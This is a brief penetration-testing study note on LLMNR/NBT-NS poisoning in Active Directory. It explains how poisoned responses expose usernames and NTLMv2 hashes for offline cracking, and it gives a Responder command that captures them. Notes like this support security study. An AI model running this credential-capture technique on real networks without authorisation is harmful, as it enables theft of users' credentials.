# Active Directory
## LLMNR Poisoning
- Link Local Multicast Name Resolution (LLMNR)
- Used to identify hosts when DNS fails to do so.
- Previously NBT-NS.
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.
- With a MitM, you can observe the broadcast for people looking to connect to a share and crack the hash offline.

::: {.callout-note}
You must be on the same network to capture this traffic.
:::

To run the process:
````bash
sudo responder -I {interface} -dwP
````
